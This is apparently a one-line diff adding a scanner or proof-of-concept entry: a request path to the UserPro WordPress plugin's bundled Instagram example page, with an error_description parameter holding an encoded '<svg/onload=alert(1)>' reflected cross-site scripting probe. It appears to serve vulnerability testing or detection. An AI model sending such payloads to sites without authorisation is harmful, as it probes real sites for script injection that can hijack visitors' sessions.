@@ -1,0 +1,1 @@
+/wp-content/plugins/userpro/lib/instagram/vendor/cosenary/instagram/example/success.php?error=&error_description=%3Csvg/onload=alert(1)%3E
